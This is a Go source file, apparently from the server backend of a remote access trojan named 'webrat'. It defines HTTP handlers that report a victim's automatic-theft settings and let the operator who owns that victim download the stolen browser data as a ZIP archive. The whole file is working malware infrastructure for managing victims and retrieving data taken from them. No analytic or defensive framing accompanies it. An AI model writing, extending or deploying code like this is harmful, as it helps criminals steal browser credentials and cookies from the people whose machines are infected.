package httpapi

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"webrat-go-api/internal/stealstore"
)

func (s *Server) handleStealInfo(w http.ResponseWriter, r *http.Request) {
	login := loginFromContext(r)
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	victimID := strings.TrimSpace(r.URL.Query().Get("victim_id"))
	if victimID == "" {
		http.Error(w, "missing victim_id", http.StatusBadRequest)
		return
	}

	if s.db != nil {
		owner, ok, err := s.db.GetVictimOwnerByID(victimID)
		if err != nil || !ok || strings.ToLower(owner) != strings.ToLower(login) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	dir := stealstore.DataDir(victimID)
	autoSteal := "disabled"
	stealTime := "-"

	if data, err := os.ReadFile(filepath.Join(dir, "meta.json")); err == nil {
		var meta map[string]string
		if json.Unmarshal(data, &meta) == nil {
			if v := meta["auto_steal"]; v != "" {
				autoSteal = v
			}
			if v := meta["steal_time"]; v != "" {
				stealTime = v
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{
		"auto_steal": autoSteal,
		"steal_time": stealTime,
	})
}

func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
	login := loginFromContext(r)
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	victimID := strings.TrimSpace(r.URL.Query().Get("victim_id"))
	if victimID == "" {
		http.Error(w, "missing victim_id", http.StatusBadRequest)
		return
	}

	if s.db != nil {
		owner, ok, err := s.db.GetVictimOwnerByID(victimID)
		if err != nil || !ok || strings.ToLower(owner) != strings.ToLower(login) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	dir := stealstore.DataDir(victimID)
	browserDir := filepath.Join(dir, "Browser")

	entries, err := os.ReadDir(browserDir)
	if err != nil || len(entries) == 0 {
		metaPath := filepath.Join(dir, "meta.json")
		metaB, metaErr := os.ReadFile(metaPath)
		if metaErr != nil {
			http.Error(w, "no steal data", http.StatusNotFound)
			return
		}

		w.Header().Set("Content-Type", "application/zip")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"steal_%d.zip\"", time.Now().UnixNano()))
		zw := zip.NewWriter(w)
		defer func() { _ = zw.Close() }()
		fw, cErr := zw.Create("meta.json")
		if cErr == nil {
			_, _ = fw.Write(metaB)
		}
		return
	}

	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"steal_%d.zip\"", time.Now().UnixNano()))

	zw := zip.NewWriter(w)
	defer func() { _ = zw.Close() }()

	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		data, err := os.ReadFile(filepath.Join(browserDir, e.Name()))
		if err != nil {
			continue
		}
		fw, err := zw.Create("Browser/" + e.Name())
		if err != nil {
			continue
		}
		_, _ = fw.Write(data)
	}
}
